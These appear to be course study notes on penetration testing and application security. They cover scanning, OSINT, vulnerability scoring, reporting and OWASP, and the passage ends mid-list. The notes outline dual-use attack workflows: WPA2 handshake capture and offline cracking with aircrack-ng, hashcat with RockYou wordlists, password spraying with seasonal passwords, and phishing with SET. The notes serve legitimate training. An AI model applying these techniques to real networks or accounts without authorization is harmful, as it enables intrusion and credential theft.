			§ Documentation and ruleset reviews are useful, but theoretical.

			§ Discovery scanning provides practical, current-state information.

			§ Helps confirm which systems are live and what services they run.

		○ Preparation

			§ Use network diagrams and firewall configs to build a target list.

			§ Configure scanning tools to match the target network segments.

		○ Two Types of Discovery Scanning

			§ Active Scanning

				• Directly interacts with systems by sending packets.

				• Examples:

					® Ping (ICMP) → checks if host is up.

					® OS/service fingerprinting → identifies running systems and services.

				• More thorough but can disrupt fragile systems.

			§ Passive Scanning

				• Does not interact with targets.

				• Captures traffic (e.g., via Wireshark) and extracts source/destination IPs and services.

				• Safer but requires network visibility.

		○ Evolving Tools

			§ Vendors like Tenable and Qualys now offer passive network scanners.

			§ Devices sit on networks, monitor traffic, and identify live hosts automatically.

		○ Special Case: OT/ICS Environments

			§ Industrial Control Systems (ICS) and Operational Technology (OT) often can’t tolerate active scans.

			§ Risks: simple active probes may cause devices to crash or reset to factory defaults.

			§ Passive scanning is strongly recommended in these environments.



Open Source Intelligence

	• OSINT gathering is a passive technique that leverages publicly available information to identify target systems without directly interacting with them. It’s valuable for penetration testers but comes with limitations such as inaccuracy, outdated data, and limited usefulness for internal networks.

	• Key Concepts

		○ Definition of OSINT Gathering

			§ Uses publicly available repositories and information.

			§ Does not directly touch target systems.

			§ Helps identify systems and infrastructure for further assessment.

		○ Limitations

			§ Data may be inaccurate or outdated (false positives if systems were decommissioned).

			§ Generally limited to internet-facing systems, not internal networks.

		○ Exception – DNS Zone Transfers

			§ If improperly configured, a DNS zone transfer can expose internal hostnames and IP addresses.

			§ Best practice: restrict zone transfers to authorized internal hosts only, or disable them entirely.

			§ Performing zone transfers requires explicit client permission.

		○ OSINT Resources

			§ Shodan – Search engine for internet-connected devices.

			§ Censys – Provides internet-wide scan data.

			§ BGP Toolkit – Helps analyze internet routing information.

			§ Hacker Target Zone Transfer Test – Semi-passive tool to test DNS servers.

			§ ZoneTransfer.me (by Digi Ninja) – Safe environment to practice DNS zone transfers.

		○ Rules of Engagement

			§ Always get client approval before attempting semi-passive methods like DNS queries.

			§ In some cases, clients may provide direct DNS exports instead.

		○ Unexpected Discoveries

			§ Network discovery (via OSINT or scanning) may uncover unauthorized devices.

			§ Best practice: stop and notify the client immediately.

				□ Could be a policy violation (employee device).

				□ Or worse, an attacker-planted device for persistence.



Network Port and Service Identification

	• After discovering live hosts, the next step in network assessment is identifying open ports and running services. This provides deeper insight into potential security risks, especially insecure protocols and exposed administration services. Tools like Nmap make this process efficient but require careful configuration for thorough and accurate results.

	• Key Concepts

		○ Importance of Port \& Service Discovery

			§ Finding hosts is just the start; knowing which ports are open and which services are running is critical for security assessment.

			§ Reveals potential attack vectors for exploitation.

		○ Dealing with Blocked Ping

			§ Some hosts/networks block ICMP ping requests.

			§ Nmap has a flag to assume hosts are alive, improving detection accuracy at the cost of longer scans.

		○ Key Targets to Identify

			§ Unencrypted protocols → high risk:

				□ Telnet.

				□ FTP.

				□ HTTP (credentials often visible in captures).

			§ Remote administration tools → sensitive:

				□ SSH, RDP, VNC, HTTPS.

			§ Nmap Options for Service Identification

				□ -A (aggressive scan) → detects service/version information.

				□ Default scan → top 1,000 most common TCP ports.

				□ -p flag → specify ports/ranges:

					® Example: -p 80 for HTTP.

					® -p 1-65535 → scans all 65k+ TCP ports (and UDP, if specified).

				□ -p 1-65535 → scans all 65k+ TCP ports (and UDP, if specified).

			§ Trade-off: broader scans = more time and network traffic, but yield comprehensive results.

		○ Scanning Strategy for DMZs

			§ Perform scans from both external and internal vantage points:

				□ External scan → shows what outsiders can access.

				□ Internal scan → shows what an attacker could exploit if they gain a foothold inside.



Vulnerability Scanning

	• After host and service discovery, the next step is vulnerability scanning—identifying weaknesses that attackers could exploit. Vulnerability scans provide descriptions, severity scores, and remediation guidance, but they carry risks, especially with older or fragile systems. The choice between authenticated and unauthenticated scans is critical for balancing depth of results and potential impact.

	• Key Concepts

		○ Purpose of Vulnerability Scanning

			§ Detect weaknesses that could be:

				□ Exploited intentionally by attackers.

				□ Exploited intentionally by attackers.

			§ Scanners provide:

				□ Vulnerability description.

				□ Severity score.

				□ Remediation guidance.

			§ Risks of Vulnerability Scans

				□ Scans can disrupt fragile or outdated systems (e.g., old switch rebooting mid-scan).

				□ Even authorized scans can cause unintended outages.

				□ However, findings can justify upgrades and strengthen security.

			§ Authenticated vs. Unauthenticated Scans

				□ Authenticated scans:

					® Provide deeper, more complete results.

					® Higher risk of negative impact.

				□ Unauthenticated scans:

					® Simulate an outsider’s view.

					® Safer for fragile systems but less detailed.

				□ Recommended Best Practices

					® Internal hosts: Perform authenticated scans.

					® External hosts: Perform unauthenticated scans.

					® Web applications:

						◊ Non-production → authenticated scans.

						◊ Production → unauthenticated scans.

					® Mobile applications: Perform offline scans on production instances.



Determining Severity

	• Vulnerability severity is determined by evaluating both the likelihood of exploitation and the impact if exploited. Industry standards such as CVSS, CWE, and EPSS provide structured, repeatable ways to assess and prioritize vulnerabilities for remediation.

	• Key Concepts

		○ Severity Factors

			§ Likelihood of exploitation → how easy is it for an attacker?

			§ Impact of exploitation → what happens if successful (confidentiality, integrity, availability)?Examples

		○ Examples

			§ Low severity: external system leaks internal hostnames.

			§ High severity: internet-facing system with command injection allowing full admin control.

		○ Common Vulnerability Scoring System (CVSS)

			§ Open industry standard for scoring OS vulnerabilities.

			§ Uses base metrics:

				□ Access vector (how it’s exploited).

				□ Attack complexity (easy vs. difficult).

				□ Authentication (does attacker need credentials?).

			§ Uses impact metrics: CIA triad (confidentiality, integrity, availability).

			§ Produces a repeatable severity score.

		○ Common Weakness Enumeration (CWE)

			§ Catalog of software/hardware weaknesses that can lead to vulnerabilities.

			§ Includes:

				□ Likelihood of exploit.

					® Memberships/relationships (e.g., CWE-242 → dangerous functions → linked to prohibited code).

				□ Helps testers map and connect related vulnerabilities.

		○ Exploit Prediction Scoring System (EPSS)

			§ Predicts likelihood of exploitation in the wild.

			§ Uses data and statistics.

			§ Provides a percentage score → closer to 100% = higher urgency.

			§ Complements CVSS and CWE.

		○ Vulnerability Disclosure Lifecycle

			§ Ethical researchers first privately disclose findings to vendors.

			§ Vendors patch before public release.

			§ Once public, scanning vendors develop detection signatures.

			§ Security testers then use updated tools to detect those vulnerabilities.



Wireless Nessus

	• Wireless scanning is a critical step in securing enterprise environments that rely heavily on Wi-Fi. It involves understanding the scope, environment, and security settings of wireless networks, identifying weak configurations, and ensuring that organizations adopt strong, modern standards like WPA2/WPA3 Enterprise.

	• Key Concepts

		○ Evolution of Wireless in Enterprise

			§ Early 2000s → wireless adoption grew slowly.

			§ 2007 iPhone launch → accelerated the mobile enterprise experience.

			§ Now common to see multiple networks:

				□ Managed devices.

				□ Personal/BYOD devices.

				□ IoT devices.

		○ Pre-Assessment Questions

			§ Which locations should have wireless enabled?

			§ Any environmental interference? (e.g., window films, nearby networks).

			§ What security settings should apply (policy review)?

			§ What does a normal usage day look like (ensure endpoints are active during scans)?

			§ Are there security technologies that could interfere with scans?

		○ Wireless Scanning Setup

			§ Use a second wireless antenna → separates scanning traffic from normal traffic.

			§ Ensures cleaner, dedicated wireless data collection.

		○ Wireless Security Configurations (least → most secure)

			§ Open/unencrypted → no protection.

			§ WEP → insecure, easily broken.

			§ WPA → also broken.

			§ WPA2 (personal) → stronger, but only requires a password.

			§ WPA2 Enterprise → strong encryption + certificate-based authentication.

			§ WPA3 Enterprise → most secure option.

		○ Penetration Testing Considerations

			§ Any configuration weaker than WPA2 = significant risk.

			§ Tools to break WEP/WPA have been effective for years.

			§ WPA2/WPA3 Enterprise is recommended:

				□ Requires both password + certificate, preventing simple credential-based access.



Wireless Testing Process

	• The wireless testing process uses both passive and active scanning techniques to identify wireless networks, capture authentication handshakes, and potentially crack encryption keys to test the strength of wireless security.

	• Key Concepts

		○ Passive Wireless Scanning

			§ Tools monitor the airwaves for wireless traffic.

			§ Works with both access point broadcasts and connected client traffic.

			§ Tools:

				□ Wireshark → captures wireless packets similar to wired captures.

				□ Airmon-ng → creates a virtual wireless adapter and lists networks, encryption settings, channels, MAC addresses of APs and clients.

				□ Airodump-ng → collects authentication handshakes between clients and access points.

		○ Active Wireless Scanning

			§ Goes beyond monitoring; involves interacting with targets.

			§ Example: Aireplay-ng → forces a client to disconnect, then intercepts the handshake during reconnection.

			§ More intrusive but more effective for penetration testing.

		○ Penetration Testing on WPA2 Personal Networks

			§ Common workflow:

				□ Capture handshake with Airodump-ng + Aireplay-ng.

				□ Use Aircrack-ng to brute force the captured encrypted handshake offline.

				□ If successful → recover plaintext Wi-Fi password.

				□ Attacker/tester can then authenticate to the network.

		○ Testing Goal

			§ Demonstrates whether weak or guessable Wi-Fi credentials can be exploited.

			§ Highlights risks of relying only on WPA2 Personal passwords.



#### Vulnerability Validation



Password Cracking

	• Password cracking is a vital penetration testing technique for validating vulnerabilities. Since most breaches involve weak or compromised credentials, testers must understand how passwords are stored, how attackers crack them, and how to demonstrate the real risk of weak authentication.

	• Key Concepts

		○ Why Password Cracking Matters

			§ Vulnerability validation → proving weaknesses are real and exploitable.

			§ F5 breach analysis: 87% of breaches were tied to app security or identity/access management flaws.

			§ Verizon DBIR confirms this trend continues → attackers still focus on weak passwords and technical vulnerabilities.

			§ Pentesters repeatedly succeed by exploiting weak credentials to impersonate users.

		○ How Passwords Are Stored

			§ Applications often store hashed passwords, not plaintext.

			§ Hashing = one-way function producing a unique output.

			§ Login works by hashing user input and comparing it to the stored hash.

			§ Cracking = finding the plaintext password that matches a stored hash.

		○ Password Cracking Techniques

			§ Use wordlists to test possible passwords against hashes.

			§ Wordlist quality directly impacts cracking success.

			§ Cracking overlaps art + science: choosing likely candidates is key.

		○ RockYou Wordlists

			§ 2009 RockYou breach leaked 32M real-world passwords.

			§ Became a go-to wordlist for penetration testers.

			§ Expanded into RockYou2021 and RockYou2024, now with billions of entries.

			§ Included in Kali Linux by default (/usr/share/wordlists).

		○ Tools for Password Cracking

			§ Hashcat → fast, supports many hash types.

			§ Uses RockYou and similar wordlists effectively.

			§ Other resources: Hash Crack: Password Cracking Manual.



Penetration Test Planning

	• Effective penetration test planning requires clearly defining the scope, goals, and methodology, ensuring proper authorization, and aligning test activities with the client’s expectations. Pen tests often focus on privilege escalation and lateral movement but may target specific data or systems depending on compliance or business needs.

	• Key Concepts

		○ Core Pen Test Activities

			§ Privilege escalation → compromise a system and gain admin-level access.

			§ Lateral movement → expand from one compromised system/application to others, extracting sensitive data.

			§ Alternative goals (e.g., PCI DSS) may focus on compromising cardholder data without needing admin credentials.

		○ Importance of Client Goals

			§ Understanding why the client requested the test is critical.

			§ Goals may vary: sensitive data exposure, regulatory compliance, or resilience testing.

		○ Methodologies

			§ NIST Four-Stage Approach:

				□ Planning.

				□ Discovery.

				□ Attack → includes gaining access, escalating privileges, system browsing, tool installation.

				□ Reporting.

			§ Penetration Testing Execution Standard (PTES):

				□ Pre-engagement interactions.

				□ Intelligence gathering.

				□ Threat modeling.

				□ Vulnerability analysis.

				□ Exploitation.

				□ Post-exploitation.

				□ Reporting.

			§ Best practice: combine and adapt methodologies instead of strictly following one.

		○ Planning Essentials

			§ Define scope, methodology, and goals upfront.

			§ Obtain written authorization from the client to test in-scope systems/applications.

		○ Possible Areas of Focus

			§ Internet-facing systems and applications.

			§ Mobile applications.

			§ Internal systems and applications.

			§ Physical office locations.

			§ Company employees (social engineering).

			§ Third-party hosted systems and applications.



Penetration Test Tools

	• Penetration test tools support reconnaissance, OSINT gathering, vulnerability analysis, and credential discovery. Tools range from automated scripts like Discover to specialized OSINT, metadata, and vulnerability scanners. Testers must balance automation with stealth, since noisy tools can trigger detection systems.

	• Key Concepts

		○ Reconnaissance vs. Scope

			§ After scope is defined, testers should do their own reconnaissance.

			§ Compare findings with client’s scope → sometimes uncover overlooked systems/apps still online.

		○ OSINT \& Discover Tool

			§ Discover (by Lee Baird) automates OSINT gathering.

			§ Built on Recon-ng and The Harvester.

			§ Requires API keys for best results:

				□ Bing, Google, Google CSE.

				□ BuiltWith (tech profiling).

				□ FullContact (person/company data).

				□ GitHub (code repos).

				□ Hunter.io (email addresses).

				□ SecurityTrails (DNS, IP).

				□ Shodan (domains, hosts, open ports).

			§ Produces rich, automated OSINT quickly.

		○ Vulnerability Analysis Approaches

			§ Automated Scanners (e.g., Nessus, Qualys):

				□ Detailed \& accurate results.

				□ Risk: noisy, may trigger SIEM alerts or IPS blocks.

			§ OSINT + Credentials Approach:

				□ Stealthier → avoids tripping alarms.

				□ Relies on gathering emails/usernames and exploiting login weaknesses.

		○ Credential Discovery Techniques

			§ OSINT often reveals emails + usernames.

			§ Patterns: firstname.lastname, f.lastname, firstname\_lastname.

			§ Tools:

				□ Hunter.io → identifies email naming conventions.

				□ Discover (with APIs) → automates collection.

				□ Manual Hunter searches → same info without automation.

				□ FOCA and Metagoofil → extract usernames from document metadata (Word, PDF, Excel).

			§ Once naming convention is known, LinkedIn can be mined for employee names → generate valid usernames.



Penetration Test Techniques

	• One of the most effective penetration testing techniques is password spraying, which exploits common user behaviors and weak password practices. Pen testers must keep up with evolving offensive and defensive techniques, using resources like the Red Team Field Manual (RTFM) and Blue Team Field Manual (BTFM) to stay sharp.

	• Key Concepts

		○ Password Spraying Technique

			§ Definition: Instead of testing many passwords against one username, test one password across many usernames.

			§ Advantage: Avoids account lockouts (since most systems don’t lock out users after a single failed attempt).

			§ Attack model: Just one weak but commonly used password can compromise accounts.

		○ Common Password Patterns Exploited

			§ Example: Season + Year + Special Character (e.g., Summer2025!).

			§ These meet typical password complexity requirements:

				□ Uppercase + lowercase.

				□ Alphanumeric.

				□ Minimum length.

				□ Special character.

			§ They also align with 90-day rotation policies (seasonal changes).

		○ Policy Context

			§ Many organizations still require 90-day password changes, despite NIST guidance advising against forced periodic changes.

			§ This outdated practice encourages predictable password patterns.

		○ Evolution of Techniques

			§ Penetration testing methods are constantly evolving.

			§ Successful testers stay updated on both attacker tools and defensive strategies.

		○ Recommended Resources

			§ Red Team Field Manual (RTFM) → offensive tactics, commands, scripts.

			§ Blue Team Field Manual (BTFM) → defensive strategies, incident response, log analysis.

			§ Both provide practical, field-ready references.



Social Engineering

	• Social engineering exploits human behavior rather than technology, making it one of the most effective attack methods. For penetration testers, it’s essential to include social engineering in engagements to evaluate user awareness, identify weaknesses, and provide actionable improvements for organizational resilience.

	• Key Concepts

		○ Nature of Social Engineering

			§ Focuses on tricking people into taking harmful actions.

			§ Easier than hacking technical systems in many cases.

			§ Should always be included in penetration tests.

		○ Common Attack Methods

			§ Phishing → malicious emails with attachments or links installing malware.

			§ Credential harvesting →

				□ Impersonating trusted staff (e.g., help desk calls).

				□ Fake login pages mimicking legitimate sites.

			§ Password reset abuse → exploiting weak secret questions (OSINT-driven).

		○ Tools

			§ Social Engineer Toolkit (SET):

				□ Open-source Python tool by Dave Kennedy.

				□ Pre-installed in Kali Linux.

				□ Contains multiple attack vectors against websites, wireless networks, email, mobile, and hardware.

				□ Automates phishing, credential harvesting, and other social engineering attacks.

		○ Beyond Phishing

			§ Physical site visits → test office security by bypassing reception, planting rogue devices, or leaving malicious USB drives.

			§ MFA social engineering → tricking users into providing valid MFA codes under the guise of IT support.

			§ Password self-service portals → exploiting weak or easily guessed answers to reset credentials without direct contact.

		○ Ethical Purpose

			§ Goal isn’t to embarrass employees.

			§ Purpose is to evaluate awareness, identify weak spots, and provide targeted guidance to strengthen defenses.



#### Additional Considerations



Coordinating Your Assessments

	• Coordinating security assessments requires careful planning around stakeholders, scheduling, access, authorization, incident response, and communication. Proper coordination minimizes risks, prevents unnecessary disruptions, and ensures sensitive findings are handled securely.

	• Key Concepts

		○ Stakeholder Identification

			§ Goes beyond the cybersecurity team.

			§ Includes network, system, and application administrators, as well as help desk teams.

			§ Engaging managers early prevents confusion if suspicious activity is detected.

		○ Scheduling Considerations

			§ Choose times that minimize operational impact.

			§ Avoid blackout periods such as:

				□ Retail holidays.

				□ Large IT project cutovers.

			§ Running assessments during these times adds unnecessary business risk.

		○ Access and Authorization

			§ Ensure testers have required credentials for authenticated scans or insider simulations.

			§ For physical social engineering tests, testers must carry written authorization letters from the client.

			§ Real-world risk: testers could be mistaken for intruders (even arrested) without proper documentation.

		○ Incident Response Planning

			§ Document an engagement incident response plan before starting.

			§ Address scenarios such as:

				□ Discovering an active compromise during testing.

				□ Accidentally disrupting production services.

			§ Plan should define escalation paths and communication protocols.

		○ Communication Plan

			§ Define how updates will be shared with clients:

				□ Weekly emails.

				□ Daily or twice-daily updates.

				□ Real-time channels like Slack.

			§ Ensure secure communication methods (avoid unencrypted email for sensitive data).

			§ Align expectations with the client before the assessment begins.

		○ Pre-Engagement Meeting

			§ Best way to clarify scope, access, communication, and expectations.

			§ Ensures both client and testers are aligned and avoids misunderstandings.

			



Data Analysis

	• Data analysis during a security assessment should happen continuously, not just at the end. Effective analysis requires balancing curiosity and technical exploration with time management and client-focused reporting.

	• Key Concepts

		○ Ongoing Analysis

			§ Don’t wait until the end → analyze findings as you go.

			§ Helps maintain focus and ensures key findings aren’t overlooked.

		○ Challenge of Focus

			§ Pen testing is exciting (legal hacking, puzzles, exploration).

			§ Curiosity can cause testers to lose track of time and drift from engagement goals.

			§ Tight timeframes make time management essential.

		○ Discipline Through Practice

			§ Build analysis and reporting discipline with structured exercises:

				□ Run a Nessus vulnerability scan on a lab VM.

				□ Set a 60-minute timer to analyze results and draft a summary report.

				□ Hard stop after 60 minutes → focus on identifying critical findings and articulating why they matter.

			§ Repeating the exercise improves both analysis skills and time management.

		○ From Findings to Storytelling

			§ Clients don’t just want to know there are vulnerabilities.

			§ They want context:

				□ Why the issue matters.

				□ How it could impact business operations, security, or reputation.

			§ Reporting should translate technical results into business risk.



Providing Context

	• Even lower-severity vulnerabilities can be dangerous when chained together. Security testers must provide context in their analysis, connecting related findings into realistic attack paths that automated scans alone won’t reveal.

	• Key Concepts

		○ Don’t Ignore Low-Severity Issues

			§ Lower-severity vulnerabilities may seem minor in isolation.

			§ Attackers (and skilled pen testers) can chain them together to achieve serious compromise.

		○ Real-World Example (D-Link Routers, 2018)

			§ Vulnerabilities chained:

				□ Directory traversal (CVE-2018-10822).

				□ Admin password stored in plaintext (CVE-2018-10824).

				□ Arbitrary code execution (CVE-2018-10823).

			§ Attack sequence:

				□ Use directory traversal to browse sensitive files.

				□ Extract plaintext admin password.

				□ Log in and exploit remote code execution as an authenticated user.

			§ Result → full compromise of affected devices.

		○ Scanner vs. Pen Tester

			§ Vulnerability scans flag issues individually, without linking them.

			§ Penetration tests add value by analyzing and demonstrating how issues can be combined into a real-world exploit chain.

		○ Contextual Analysis Is Critical

			§ Testers must go beyond surface-level reporting.

			§ Providing context helps organizations see the true business risk of vulnerabilities.



Data Handling

	• Security assessments generate highly sensitive data that, if mishandled, could aid attackers. Therefore, data handling must be as carefully planned as the testing itself, covering collection, storage, transmission, and destruction.

	• Key Concepts

		○ Sensitivity of Assessment Data

			§ Data collected includes:

				□ Vulnerability scan artifacts.

				□ Notes, spreadsheets, mind maps.

				□ Communications (emails, Slack, voicemails).

				□ The final report (a step-by-step attack guide if leaked).

			§ Mishandling this data could cause severe damage to the client.

		○ Four Key Areas of Data Handling

			§ Collection

				□ Only collect what’s needed → avoid unnecessary liability.

			§ Storage

				□ Enforce strong encryption for data at rest.

				□ Use tools like BitLocker (Windows), FileVault (Mac), or VeraCrypt for encrypted volumes.

			§ Transmission

				□ Never send data over unencrypted channels.

				□ Use encrypted email or secure file-sharing services (Box, SharePoint, Google Drive).

				□ Apply principle of least privilege for access.

			§ Low-Tech Safeguards

				□ Add cover pages and confidential markings on reports.

				□ Helps prevent accidental mishandling.



Drafting Your Report

	• A security assessment report must be carefully drafted, QA’d, and tailored to different audiences (executives, management, and staff). Each audience has unique needs, and addressing them ensures the report is actionable and well-received.

	• Key Concepts

		○ Don’t Deliver the First Draft

			§ Avoid sending a single unreviewed draft.

			§ Seek client feedback during the process.

			§ Have a QA reviewer (someone other than yourself) check the report.

		○ Three Key Audiences \& Their Needs

			§ Executives (high-level view):

				□ Want the big picture, not technical details.

				□ Use the executive summary (short, business-centric language).

				□ Their focus: budget, staffing, and strategic decisions.

			§ Management (resource allocation):

				□ Need a punch-down list of priorities.

				□ Responsible for reallocating staff, hiring, purchasing licenses, updating security documentation, and coordinating communication.

				□ Their focus: logistics, timelines, and resourcing.

			§ Staff (technical detail):

				□ Network admins, sysadmins, developers.

				□ Need specific remediation steps and technical details to implement fixes.

				□ Their focus: execution and hands-on remediation.

			§ Tailoring the Report

				□ One report → three perspectives.

				□ Ensure the draft speaks to all audiences before delivery.



Delivering Your Report

	• Delivering a security assessment report should be a staged, client-focused process that ensures alignment with expectations, engages stakeholders, and provides both findings and context to maximize impact.

	• Key Concepts

		○ Map Report to Statement of Work (SOW)

			§ Every item in the report should trace back to the client’s original request.

			§ Ensures the final deliverable aligns with expectations and scope.

		○ Deliver in Stages

			§ Stage 1 – Draft Review Meeting

				□ Share a polished draft (well-formatted, free of spelling errors).

				□ Primary goal: give client contact a chance to respond, correct, or refine.

				□ Include client-specific details (culture, challenges) to increase relevance.

			§ Stage 2 – Final Delivery Meeting

				□ Include key stakeholders since they will be most impacted.

				□ Be prepared for tension (e.g., internal power struggles) that could shape how findings are received.

		○ Provide Context Alongside Findings

			§ Don’t just deliver vulnerabilities and technical issues.

			§ Explain why findings matter, how they impact the organization, and how fixes will benefit the business, employees, and customers.

			§ “Context is everything.”

		○ Follow Secure Data Handling Procedures

			§ Use your established data handling plan (secure storage, transmission, access).

			§ Only then mark the assessment as complete.

#### Additional Resources



📚 Recommended Books

	• RTFM: The Red Team Field Manual

	• BTFM: The Blue Team Field Manual

	• Hash Crack: The Password Cracking Manual

	• Penetration Testing: A Hands-On Introduction to Hacking



📑 Key NIST Publications

	• SP 800-30 Rev 1 – Guide for Conducting Risk Assessments

	• SP 800-53 Rev 5 – Security and Privacy Controls for Federal Information Systems and Organizations

	• NIST Cybersecurity Framework (CSF)

	• (Previously referenced: SP 800-115 – Technical Guide to Information Security Testing and Assessment)



👥 Professional Organizations

	• ISSA – issa.org

Great for security generalists.

	• ISACA – isaca.org

Focused on IT auditors and cross-functional discussions.

	• ISC² – isc2.org

Certification body for CISSP, CSSLP, etc.

	• InfraGard – infragard.org

Public-private sector collaboration in the U.S.

	• OWASP – owasp.org

Focus on application and web security.



🎤 Conferences \& Events

	• InfoSec Conferences – infosec-conferences.com

	• BSides Security Conferences – securitybsides.com

Affordable, community-run conferences.

	• YouTube Security Talks – irongeek.com (Adrian Crenshaw’s recordings)



📡 Stay Connected

	• LinkedIn Learning Courses – by Jerod

	• Simplifying Cybersecurity (LinkedIn page for ongoing updates)





---------------------------------------------------------------------------------------------------------------------------------------------------------------------------



### Static Application Security Testing (SAST)

#### Leading Practices



Security in the SDLC

	• Security must be integrated into the Software Development Life Cycle (SDLC) in a way that aligns with developers’ priorities and workflows. This is best achieved by breaking security into manageable touchpoints, starting with static testing, and balancing technical, organizational, and market considerations.

	• Key Concepts

		○ SDLC Overview

			§ Three stages: Conceptualize → Develop → Release.

			§ From a developer’s perspective, security often feels like an afterthought or burden unless properly integrated.

		○ Developer Perspective

			§ Developers face competing priorities, deadlines, and unclear requirements.

			§ Adding “make it secure” without guidance increases stress.

			§ Security professionals should “seek first to understand” developers’ challenges.

		○ Four Security Touchpoints in the SDLC

			§ Documentation review: Ensure contracts and third-party work include security requirements.

			§ Source code review: Identify vulnerabilities early.

			§ QA process review: Confirm security tests are included.

			§ Deployed application review: Test for exploitable weaknesses post-release.

		○ Static Testing

			§ Focuses on documentation and code review, with some overlap into QA.

			§ Advantages:

				□ Cheaper to fix issues before production.

				□ More effective when built-in early vs. bolted-on later.

				□ Low-risk because it doesn’t disrupt production systems.

			§ Balance in Security Testing

				□ Consider developer workflows, market pressures (e.g., release deadlines, outsourcing), and team skill levels.

				□ Don’t assume skills—assess strengths/weaknesses of both developers and testers.

				□ Design tests that respect these constraints to ensure adoption and effectiveness.

			§ Outcome

				□ A balanced, integrated approach reduces both the likelihood and impact of security vulnerabilities.

				□ Security becomes part of the development culture, not an afterthought.



Development Methodologies

	• Understanding application development methodologies is essential for integrating security testing effectively. Since different organizations and teams use different frameworks, security professionals must adapt their approach to fit the chosen methodology.

	• Key Concepts

		○ Why Methodologies Matter

			§ Methodologies = frameworks that define how teams plan, build, and deploy applications.

			§ They are especially critical for large-scale teams where orchestration is required.

			§ Security integration depends on the methodology in use.

		○ Four Popular Methodologies

			§ Waterfall (Structured \& Sequential)

				□ Origin: Popularized by the U.S. DoD in the 1980s.

				□ Process: Phased approach — Requirements → Design → Implementation → Testing → Integration → Deployment → Maintenance.

				□ Security Fit: Straightforward — embed security requirements in each phase and perform checks between phases.

			§ Agile (Iterative \& Flexible)

				□ Origin: Agile Manifesto (2001) with 4 key values:

					® Individuals \& interactions > processes \& tools

					® Working software > comprehensive documentation

					® Customer collaboration > contract negotiation

					® Responding to change > following a plan

				□ Process: Continuous iteration \& prototyping; no rigid phases.

				□ Security Fit: Harder to test at the end of phases (since they don’t exist). Security must adapt to iteration cycles.

			§ Rapid Application Development (RAD)

				□ Hybrid of Waterfall and Agile.

				□ Front-loads data modeling \& business process modeling to define requirements.

				□ Then adopts iterative prototyping similar to Agile.

				□ Security Fit: More difficult than Waterfall, but feasible through code security reviews rather than heavy documentation.

			§ DevOps (Cross-functional \& Continuous)

				□ Origin: Term coined in 2009, popularized by The Phoenix Project.

				□ Brings development + IT operations together.

				□ Focus: Speed, collaboration, and ongoing changes/maintenance.

				□ Subset: DevSecOps integrates security directly into DevOps processes.

				□ Security Fit: Security must be part of continuous delivery and collaboration.

			§ Other Methodologies

				□ Variants exist (e.g., Scrum, Extreme Programming under Agile).

				□ Important to recognize that different teams use different methods, and some may blend approaches.

			



Programming Languages

	• Security testers must understand the landscape of programming languages because static application security testing (SAST) depends on the language an application is written in. You don’t need to master every language, but you should be familiar with the most common ones and their distinctions.

	• Key Concepts

		○ Variety of Programming Languages

			§ Like methodologies, developers have many programming languages to choose from.

			§ Analogy: Rosetta Stone → multiple languages expressing the same message.

			§ Today, instead of 3, there are hundreds to thousands of languages.

		○ Impact on Security Testing

			§ Different languages require different testing tools for static code analysis.

			§ SAST effectiveness depends on choosing tools that match the application’s language.

		○ Focus on Popular Languages

			§ You don’t need to be an expert in every language.

			§ Apply the 80/20 rule: ~80% of code reviewed will be written in ~20% of the most popular languages.

			§ GitHub Octoverse Report provides data on the most widely used languages.

			§ GitHub is also a useful platform for:

				□ Developer collaboration.

				□ Finding open-source code to practice security testing techniques.

		○ Distinctions Between Languages

			§ Critical to recognize differences between languages (e.g., Java vs. JavaScript).

			§ Confusing them damages credibility with developers and can invalidate tests.

		○ Language Generations

			§ Programming languages evolved by generation:

				□ Early generations → closer to hardware (machine code, assembly).

				□ Later generations → easier to read, easier to write (high-level languages).

			§ Understanding this helps put modern languages in context.

		○ Preparation for Testing

			§ Testers must build familiarity with the programming languages they’ll encounter.

			§ Knowing language characteristics is prerequisite to effective SAST.



Security Frameworks

	Security frameworks provide accumulated best practices for integrating security into application development and testing. Instead of starting from scratch, security testers can leverage established frameworks and compliance standards to guide their static application security testing (SAST).

	• Key Concepts

		○ Purpose of Security Frameworks

			§ Frameworks represent accumulated security knowledge (standing on “shoulders of giants”).

			§ They guide how to align functional goals of developers (make it work) with defensive goals of security professionals (make it safe).

			§ Nearly all major frameworks already include application security requirements.

		○ Four Recommended Security Frameworks

			§ ISO/IEC 27000 series

				□ Collection of information security standards.

				□ Common reference: ISO 27001 (ISMS).

				□ Highly practical: ISO 27002 (2022) — 93 controls, grouped into:

					® Organizational

					® People

					® Physical

					® Technological

			§ NIST Cybersecurity Framework (CSF)

				□ US NIST publications consolidated into a cybersecurity/risk management approach.

				□ 108 controls grouped into 5 functions:

					® Identify

					® Protect

					® Detect

					® Respond

					® Recover

				□ COBIT (Control Objectives for Information and Related Technology)

					® Created by ISACA.

					® Broader IT governance focus.

					® Includes application security controls linked to governance/IT controls.

				□ CIS Critical Security Controls

					® From the Center for Internet Security.

					® Provides prioritized, maturity-based controls, tailored to resources \& expertise.

					® Unlike others, CIS explicitly prioritizes which controls to address first.

		○ Compliance Standards vs. Security Frameworks

			§ Frameworks: Provide guidance/best practices.

			§ Compliance Standards: Impose mandatory rules; failure = penalties.

		○ Examples:

			§ Financial: Sarbanes-Oxley (SOX), Gramm-Leach-Bliley Act (GLBA).

			§ Healthcare: HIPAA (Health Insurance Portability and Accountability Act).

			§ Payments: PCI DSS (Payment Card Industry Data Security Standard).

			§ Privacy: GDPR (EU), CCPA (California), PIPEDA (Canada).

		○ Practical Application

			§ Use frameworks and compliance standards as foundation for building security testing strategies.

			§ Then leverage OWASP for tactical, technical guidance on how to perform tests.



The OWASP Top 10

	• OWASP (Open Web Application Security Project) is a leading nonprofit in application security, and its Top 10 Project is the most recognized resource for identifying and mitigating the most critical web application security risks. The OWASP Top 10 provides not just a list but also actionable threat modeling and remediation guidance.

	• Key Concepts

		○ About OWASP

			§ A nonprofit foundation focused on improving application security globally.

			§ Provides a wide range of open-source projects, tools, and documentation.

			§ Projects are categorized as:

				□ Flagship Projects: Mature, strategic, widely adopted (e.g., OWASP Top 10).

				□ Production Projects: Production-ready, still a growing category.

				□ Other Projects: Tools, documentation, or experimental/playground projects (some may evolve into higher status).

		○ The OWASP Top 10 Project

			§ Flagship project and OWASP’s most well-known contribution.

			§ First published in 2003.

			§ Official version-controlled updates began in 2004, with a commitment to refresh every three years.

			§ A committee of professionals reviews and updates the list based on the evolving threat landscape.

		○ Structure and Content of the Top 10

			§ The Top 10 list itself is concise, but the white paper adds depth:

				□ Explains why each risk matters.

				□ Provides methods for identifying and remediating vulnerabilities.

				□ Offers threat modeling guidance:

